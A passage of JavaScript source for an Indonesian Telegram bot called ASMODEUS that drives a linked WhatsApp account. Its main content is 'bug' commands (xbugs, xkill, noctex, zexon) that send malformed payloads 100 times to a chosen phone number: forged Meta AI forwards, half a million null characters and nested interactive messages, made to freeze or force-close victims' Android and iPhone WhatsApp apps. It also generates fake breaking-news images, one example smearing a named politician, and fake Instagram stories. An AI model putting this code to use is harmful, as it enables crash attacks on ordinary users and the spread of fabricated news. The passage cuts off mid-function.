    ctx.reply('Terjadi kesalahan saat memproses gambar ke API. Pastikan semua parameter diisi dengan benar.');
  }
});

bot.command('storyig', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/storyig nama_user | teks_story | link_gambar_background\n\nContoh:\n/storyig John Doe | Hello World | https://example.com/bg.jpg');
  }

  const [name, textStory, bgUrl] = textInput.split('|').map(p => p.trim());

  if (!name || !textStory || !bgUrl) {
    return ctx.reply('Semua kolom (Nama, Teks, dan Link Gambar) wajib diisi dengan benar!');
  }

  if (!bgUrl.startsWith('http://') && !bgUrl.startsWith('https://')) {
    return ctx.reply('Parameter ketiga harus berupa link URL background gambar yang valid!');
  }

  await ctx.reply('Sedang Proses Generate Instagram Story Mockup, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-story-ig.php?name=${encodeURIComponent(name)}&text=${encodeURIComponent(textStory)}&url=${encodeURIComponent(bgUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Generate Instagram Story!`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses mockup Instagram Story.');
  }
});

bot.command('berita', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/berita judul_berita | link_gambar_berita\n\nContoh:\n/berita Viral! Jokowi mencuri 19jt lapangan pekerjaan | https://example.com/jokowi.webp');
  }

  const [judul, imgUrl] = textInput.split('|').map(p => p.trim());

  if (!judul || !imgUrl) {
    return ctx.reply('Kedua kolom (Judul Berita & Link Gambar) wajib diisi!');
  }

  if (!imgUrl.startsWith('http://') && !imgUrl.startsWith('https://')) {
    return ctx.reply('Parameter kedua harus berupa link URL gambar berita yang valid!');
  }

  await ctx.reply('Sedang Proses Generate iNews Breaking News, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/berita.php?text=${encodeURIComponent(judul)}&url=${encodeURIComponent(imgUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Generate Fake Breaking News!\n📰 Berita: ${judul}`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API Berita.');
  }
});

bot.command('randompap', async (ctx) => {
  await ctx.reply('Sedang mencari gambar PAP acak, mohon tunggu...');

  try {
    const apiUrl = 'https://api-nanzz.my.id/docs/api/random/random-pap.php';
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: '*📸 Sukses Mengambil Random PAP!*',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat mengambil data gambar dari API. Coba lagi beberapa saat lagi.');
  }
});

bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("⚠️ Format Salah!. Example: /addadmin 12345678");
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});

bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("⚠️ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("⚠️ Format Salah!. Example : /deladmin 12345678");
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`⚠️ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});

bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("⚠️ Format Salah!. Example : /delprem 12345678");
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`⚠️ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`⚠️ Anda bukan pengguna premium.`);
  }
});

const vidthumbnail = "https://files.catbox.moe/x8lrfv.png";
bot.command("connect", async (ctx) => {
  if (ctx.from.id != OWNER_IDS) {
    return ctx.reply("⚠️ ⚠️ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ⚠️ Format: /connect 62xxx");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("⚠️ ⚠️ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("⚠️ ⚠️ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ⚠️ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "ASMODEUS");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMenu = `
<blockquote><pre>「〔 ASMODEUS 〕」</pre></blockquote>
Number: ${phoneNumber}
Pairing Code: ${formattedCode}
Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(vidthumbnail, {
      caption: pairingMenu,
      parse_mode: "HTML"
    });

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != OWNER_IDS) {
    return ctx.reply("⚠️ ⚠️ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ⚠️ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ⚠️ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ ⚠️ Gagal menghapus session");
  }
});

bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "⚠️ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ┬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("⚠️ Gagal menampilkan status bot.");
  }
});

bot.command("xbugs", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ⚠️ Example : /xbugs 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
    );
  }

  const richContent = new HTML()
    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
    .divider()
    .table(
      [
        ["Info", "Detail"],
        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
        [HTML.customEmoji("5334698175926128726", "📱") + " Platform", "ANDROID"],
        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "INVISIBLE DELAY ANDRO"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .divider()
    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
    }

    for (let i = 0; i < 100; i++) {
      await FrezeeHomeV3(sock, target);
      const delay = 1500 + Math.floor(Math.random() * 501);
      await sleep(delay);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "⚠️ Gagal Mengirim")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

bot.command("xkill", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ⚠️ Example : /xkill 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
    );
  }

  const richContent = new HTML()
    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
    .divider()
    .table(
      [
        ["Info", "Detail"],
        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
        [HTML.customEmoji("5334698175926128726", "📱") + " Platform", "ANDROID"],
        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "INVISIBLE DELAY ANDRO"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .divider()
    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
    }

    for (let i = 0; i < 100; i++) {
      await FrezeeHomeV2(sock, target);
      const delay = 1500 + Math.floor(Math.random() * 501);
      await sleep(delay);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "⚠️ Gagal Mengirim")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

bot.command("noctex", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ⚠️ Example : /noctex 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
    );
  }

  const richContent = new HTML()
    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
    .divider()
    .table(
      [
        ["Info", "Detail"],
        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
        [HTML.customEmoji("5334756145099722681", "📱") + " Platform", "IPHONE"],
        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "Force Close Invisibles"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .divider()
    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
    }

    for (let i = 0; i < 100; i++) {
      await gunma(sock, target);
      const delay = 1500 + Math.floor(Math.random() * 501);
      await sleep(delay);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "⚠️ Gagal Mengirim")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

bot.command("zexon", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ⚠️ Example : /zexon 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  if (ctx.chat.type === 'private') {
    const DRAFT_ID = 99;
    await ctx.sendRichMessageDraft(
      DRAFT_ID,
      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
    );
  }

  const richContent = new HTML()
    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
    .divider()
    .table(
      [
        ["Info", "Detail"],
        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
        [HTML.customEmoji("5334756145099722681", "📱") + " Platform", "IPHONE"],
        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "FORCE X CLOSE"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .taskList(
      { text: "Invisible Hard", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: false },
      { text: "Anti Kenon 80%", checked: true }
    )
    .divider()
    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
    .build();

  await ctx.sendRichMessage(richContent, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
      ]
    }
  });

  try {
    if (typeof sock === "undefined" || !sock) {
      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
    }

    for (let i = 0; i < 100; i++) {
      await ForceInvisIos(sock, target);
      const delay = 1500 + Math.floor(Math.random() * 501);
      await sleep(delay);
    }
  } catch (error) {
    return await ctx.sendRichMessage(
      new HTML()
        .heading(2, "⚠️ Gagal Mengirim")
        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
        .build()
    );
  }
});

const UPDATE_URL = "https://raw.githubusercontent.com/Unbandfoul/scary_autoupdate/refs/heads/main/scary.js";
const UPDATE_FILE_PATH = "./scary.js";

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https.get(url, (res) => {
      if (res.statusCode !== 200) {
        file.close(() => fs.unlink(filePath, () => {}));
        return reject(new Error(`HTTP_${res.statusCode}`));
      }

      res.pipe(file);

      file.on("finish", () => file.close(resolve));
    }).on("error", (err) => {
      file.close(() => fs.unlink(filePath, () => {}));
      reject(err);
    });
  });
}

bot.command("pullupdate", async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("⚠️ Akses hanya untuk owner!");
  }

  const thumbnailUp = "https://files.catbox.moe/x8lrfv.png";

  const prosesMsg = new HTML()
    .photo(thumbnailUp, "📥 Downloading Update...")
    .heading(2, "✨ AUTO UPDATE")
    .divider()
    .table(
      [
        ["Status", "📌 Installing File..."],
        ["Source", "GitHub Repository"],
        ["Process", "Downloading File"]
      ],
      { bordered: true, striped: true, hasHeader: false }
    )
    .divider()
    .paragraph(
      HTML.bold("⏱ Sedang melakukan sinkronisasi script...") +
      "\n" + HTML.italic("Mohon tunggu beberapa saat.")
    )
    .build();

  await ctx.sendRichMessage(prosesMsg);

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    const successMsg = new HTML()
      .photo(thumbnailUp, "✅ Update Success!")
      .heading(2, "✅ UPDATE SUCCESS")
      .divider()
      .table(
        [
          ["Status", "✅ Completed Download"],
          ["File", "scary.js"],
          ["Source", "GitHub Repository"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("⏱ Script berhasil mendownload file scary.js.") +
        "\n" + HTML.italic("♻️ Automatic Restarting bot...")
      )
      .divider()
      .footer(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
      .build();

    await ctx.sendRichMessage(successMsg);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    const errorMsg = new HTML()
      .photo(thumbnailUp, "⚠️ Update Failed!")
      .heading(2, "⚠️ UPDATE FAILED")
      .divider()
      .table(
        [
          ["Status", "⚠️ Error"],
          ["Action", "Cancelled"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("Sinkronisasi script gagal dilakukan.")
      )
      .pre(String(e.message || e), 'text')
      .build();

    await ctx.sendRichMessage(errorMsg);
  }
});

/* 
 * Function bug 🦠 
 */

/* FrezeeHomeV2 */
async function FrezeeHomeV2(sock, target) {
    await sock.relayMessage(target, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [{
                            messageType: 7,
                            mapMetadata: {
                                centerLatitude: -999999,
                                centerLongitude: 99999,
                                latitudeDelta: 99999,
                                longitudeDelta: 99999,
                                annotations: "\u0000".repeat(500000)
                            }
                        }],
                        contextInfo: {
                            forwardingScore: 9999,
                            isForwarded: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "259786046210223@bot"
                            },
                            forwardOrigin: 4,
                            botMessageSharingInfo: {
                                botEntryPointOrigin: 1,
                                forwardScore: 99
                            }
                        }
                    }
                }
            }
        }, { noSelfSync: true })
     }

/* FrezeeHomeV3 */
async function FrezeeHomeV3(sock, target) {
    await sock.relayMessage(target, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [{
                            messageType: 7,
                            mapMetadata: {
                                centerLatitude: -999999,
                                centerLongitude: 99999,
                                latitudeDelta: 99999,
                                longitudeDelta: 99999,
                                annotations: "\0".repeat(500000)
                            }
                        }],
                        contextInfo: {
                            forwardingScore: 9999,
                            isForwarded: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "259786046210223@bot"
                            },
                            forwardOrigin: 4,
                            botMessageSharingInfo: {
                                botEntryPointOrigin: 1,
                                forwardScore: 99
                            }
                        }
                    }
                }
            }
        }, { noSelfSync: true })
     }

/* IOS FC NEW - gunma (noctex) */
const buffer1 = {
  "interactiveMessage": {
    "interactiveMessage": {
      "header": {
        "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
        "subtitle": "666",
        "hasMediaAttachment": false
      },
      "body": {
        "text": "Apa yang ingin anda lakukan?"
      },
      "footer": {
        "text": "Nishiki"
      },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "quick_reply",
            "buttonParamsJson": "{\"display_text\":\"Opsi 1\",\"id\":\"opt_1\"}"
          },
          {
            "name": "quick_reply",
            "buttonParamsJson": "{\"display_text\":\"Opsi 3\",\"id\":\"opt_3\"}"
          }
        ],
        "messageParamsJson": "{}"
      },
      "mtype": "interactiveMessage",
      "id": "3EB002CBD0A177798DC757",
      "chat": "135759822622788@lid",
      "isBaileys": false,
      "sender": "215178549395532@lid",
      "fromMe": false,
      "text": "",
      "mentionedJid": [],
      "fakeObj": {
        "messageStubParameters": [],
        "labels": [],
        "userReceipt": [],
        "reactions": [],
        "pollUpdates": [],
        "eventResponses": [],
        "statusMentions": [],
        "messageAddOns": [],
        "statusMentionSources": [],
        "supportAiCitations": [],
        "key": "[SENSITIVE_DATA_OMITTED]",
        "message": {
          "interactiveMessage": {
            "header": {
              "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
              "subtitle": "666",
              "hasMediaAttachment": false
            },
            "body": {
              "text": "Apa yang ingin anda lakukan?"
            },
            "footer": {
              "text": "Nishiki"
            },
            "nativeFlowMessage": {
              "buttons": [
                "[TRUNCATED_DEPTH]",
                "[TRUNCATED_DEPTH]"
              ],
              "messageParamsJson": "{}"
            },
            "mtype": "interactiveMessage",
            "id": "3EB002CBD0A177798DC757",
            "chat": "135759822622788@lid",
            "isBaileys": false,
            "sender": "215178549395532@lid",
            "fromMe": false,
            "text": "",
            "mentionedJid": [],
            "fakeObj": {
              "messageStubParameters": [],
              "labels": [],
              "userReceipt": [],
              "reactions": [],
              "pollUpdates": [],
              "eventResponses": [],
              "statusMentions": [],
              "messageAddOns": [],
              "statusMentionSources": [],
              "supportAiCitations": [],
              "key": "[SENSITIVE_DATA_OMITTED]",
              "message": {
                "interactiveMessage": "[TRUNCATED_DEPTH]"
              }
            },
            "delete": "[FUNCTION]",
            "copyNForward": "[FUNCTION]",
            "download": "[FUNCTION]"
          }
        }
      },
      "delete": "[FUNCTION]",
      "copyNForward": "[FUNCTION]",
      "download": "[FUNCTION]"
    }
  }
};

let data;
try {
  data = JSON.stringify(buffer1, null, 2);
} catch (stringifyErr) {
  console.error(stringifyErr.message);
}

const buffer = Buffer.from(data, 'utf8');

/* IOS FC NEW 
*/
async function gunma(demmy, target) {
    const tora = { 
        botForwardedMessage: { 
            message: {
                richResponseMessage: { 
                    messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
                    submessages: [{ messageType: "AI_RICH_RESPONSE_TEXT", messageText: "olla" }],
                    unifiedResponse: { 
                        data: Buffer.from(JSON.stringify({ 
                            response_id: "666",
                            sections: [
                                { 
                                    view_model: { 
                                        primitive: { 
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel" 
                                    } 
                                }, 
                                { 
                                    view_model: { 
                                        primitive: { 
                                            language: "Gunma",
                                            code_blocks: [
                                                { "content": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭\n\n\n", "type": "NUMBER" },
                                                { "content": buffer, "type": "STR" }
                                            ],
                                            __typename: "GenAICodeUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel" 
                                    } 
                                }, 
                                { 
                                    view_model: { 
                                        primitive: { 
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                }
                            ]
                        })).toString("base64")
                    },
                    contextInfo: { 
                        forwardingScore: 1, 
                        isForwarded: true,
                        forwardedAiBotMessageInfo: { 
                            botName: "Meta AI",
                            botJid: "13135550002@s.whatsapp.net", 
                            creatorName: "Meta"
                        }
                    }
                }
            }
        }
    };
    
    const msg = generateWAMessageFromContent(target, tora, {});
    
    demmy.relayMessage(target, msg.message, { 
  noSelfSync: true,  
  messageId: msg.key.id, 
 });
}

/* IOS FC NEW - ForceInvisIos (zexon) */
const bufferZexon1 = {
  "interactiveMessage": {
    "interactiveMessage": {
      "header": {
        "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
        "subtitle": "666",
        "hasMediaAttachment": false
      },
      "body": { "text": "Apa yang ingin anda lakukan?" },
      "footer": { "text": "Nishiki" },
      "nativeFlowMessage": {
        "buttons": [
          { "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Opsi 1\",\"id\":\"opt_1\"}" },
          { "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Opsi 3\",\"id\":\"opt_3\"}" }
        ],
        "messageParamsJson": "{}"
      },
      "mtype": "interactiveMessage",
      "id": "3EB002CBD0A177798DC757",
      "chat": "135759822622788@lid",
      "isBaileys": false,
      "sender": "215178549395532@lid",
      "fromMe": false,
      "text": "",
      "mentionedJid": [],
      "fakeObj": {
        "messageStubParameters": [],
        "labels": [],
        "userReceipt": [],
        "reactions": [],
        "pollUpdates": [],
        "eventResponses": [],
        "statusMentions": [],
        "messageAddOns": [],
        "statusMentionSources": [],
        "supportAiCitations": [],
        "key": "[SENSITIVE_DATA_OMITTED]",
        "message": {
          "interactiveMessage": {
            "header": {
              "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
              "subtitle": "666",
              "hasMediaAttachment": false
            },
            "body": { "text": "Apa yang ingin anda lakukan?" },
            "footer": { "text": "Nishiki" },
            "nativeFlowMessage": {
              "buttons": ["[TRUNCATED_DEPTH]", "[TRUNCATED_DEPTH]"],
              "messageParamsJson": "{}"
            },
            "mtype": "interactiveMessage",
            "id": "3EB002CBD0A177798DC757",
            "chat": "135759822622788@lid",
            "isBaileys": false,
            "sender": "215178549395532@lid",
            "fromMe": false,
            "text": "",
            "mentionedJid": [],
            "fakeObj": {
              "messageStubParameters": [],
              "labels": [],
              "userReceipt": [],
              "reactions": [],
              "pollUpdates": [],
              "eventResponses": [],
              "statusMentions": [],
              "messageAddOns": [],
              "statusMentionSources": [],
              "supportAiCitations": [],
              "key": "[SENSITIVE_DATA_OMITTED]",
              "message": { "interactiveMessage": "[TRUNCATED_DEPTH]" }
            },
            "delete": "[FUNCTION]",
            "copyNForward": "[FUNCTION]",
            "download": "[FUNCTION]"
          }
        }
      },
      "delete": "[FUNCTION]",
      "copyNForward": "[FUNCTION]",
      "download": "[FUNCTION]"
    }
  }
};

let dataZexon;
try {
  dataZexon = JSON.stringify(bufferZexon1, null, 2);
} catch (stringifyErr) {
  console.error(stringifyErr.message);
}

const bufferZexon = Buffer.from(dataZexon, 'utf8');

async function ForceInvisIos(sock, target) {
    await sock.relayMessage('status@broadcast', {
        botForwardedMessage: { 
            message: {
                richResponseMessage: { 
                    messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
                    submessages: [{ messageType: "AI_RICH_RESPONSE_TEXT", messageText: "MakLo" }],
                    unifiedResponse: { 
                        data: Buffer.from(JSON.stringify({ 
                            response_id: "666",
                            sections: [
                                { 
                                    view_model: { 
                                        primitive: { 
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel" 
                                    } 
                                }, 
                                { 
                                    view_model: { 
                                        primitive: { 
                                            language: "Gunma",
                                            code_blocks: [
                                                { "content": "MakLo🪭\n\n\n", "type": "NUMBER" },
                                                { "content": bufferZexon, "type": "STR" }
                                            ],
                                            __typename: "GenAICodeUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel" 
                                    } 
                                }, 
                                { 
                                    view_model: { 
                                        primitive: { 
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                }
                            ]
                        })).toString("base64")
                    },
                    contextInfo: { 
                        forwardingScore: 1, 
                        isForwarded: true,
                        forwardedAiBotMessageInfo: { 
                            botName: "Meta AI",
                            botJid: "13135550002@s.whatsapp.net", 
